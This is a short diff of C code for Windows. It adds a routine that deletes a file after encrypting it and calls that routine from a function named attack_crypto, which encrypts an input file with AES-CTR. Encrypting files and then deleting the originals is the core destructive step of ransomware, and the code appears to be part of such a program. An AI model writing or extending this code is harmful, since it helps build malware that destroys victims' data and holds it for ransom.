@@ -221,6 +221,30 @@ int make_enc_path(const char *input, char *output, size_t output_size)
     return 0;
 }
 
+int delete_file_after_encrypt(const char *path)
+{
+    HANDLE h = CreateFileA(
+        path,
+        GENERIC_WRITE,
+        0,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+
+    if (h != INVALID_HANDLE_VALUE) {
+        FlushFileBuffers(h);
+        CloseHandle(h);
+    }
+
+    if (!DeleteFileA(path)) {
+        return 1; // failed
+    }
+
+    return 0; // success
+}
+
 /* Public API for cleaning the critical memory - plaintext AES key and mbedtls state variables */
 void crypto_cleanup(void)
 {
@@ -243,5 +267,10 @@ int attack_crypto(const char *input_file)
     }
 
     encrypt_file_aes_ctr(input_file, output_file, aes_key);
+
+    if (delete_file_after_encrypt(input_file) != 0) {
+        return 1;
+    }
+
     return 0;
 }
